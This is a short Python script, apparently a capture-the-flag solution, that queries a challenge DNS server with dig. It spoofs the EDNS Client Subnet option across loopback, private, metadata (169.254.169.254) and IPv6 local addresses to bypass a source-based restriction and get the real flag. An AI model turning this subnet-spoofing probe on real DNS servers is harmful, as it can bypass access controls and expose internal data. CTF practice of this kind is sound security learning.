#!/usr/bin/env python3
import subprocess
import sys
import threading

SERVER = "52.59.124.14"
PORT = "5053"
DOMAIN = "flag.ctf.nullcon.net"

# Expanded list
subnets = [
    "127.0.0.0", "127.0.0.1", "0.0.0.0", "10.0.0.0", "10.0.0.1", "10.1.1.1", 
    "192.168.0.0", "192.168.0.1", "192.168.1.1", "192.168.100.1",
    "172.16.0.0", "172.16.0.1", "172.31.0.1",
    "169.254.169.254", # Metadata
    "100.64.0.1", # CGNAT
    "198.18.0.1",
    "::1", "fc00::1", "fe80::1"
]

def check_subnet(subnet):
    cmd = ["dig", f"@{SERVER}", "-p", PORT, "+short", "TXT", DOMAIN, f"+subnet={subnet}"]
    try:
        output = subprocess.check_output(cmd, timeout=3).decode('utf-8').strip()
        print(f"Subnet {subnet}: {output}") # DEBUG output
        if output and "FAKEFLAG" not in output:
            print(f"!!! FOUND with {subnet}: {output}")
            return True
    except Exception as e:
        print(f"Error {subnet}: {e}")
    return False

def worker(subnets):
    for s in subnets:
        if check_subnet(s):
            break

# Run manually without threading for debug clarity
for s in subnets:
    check_subnet(s)
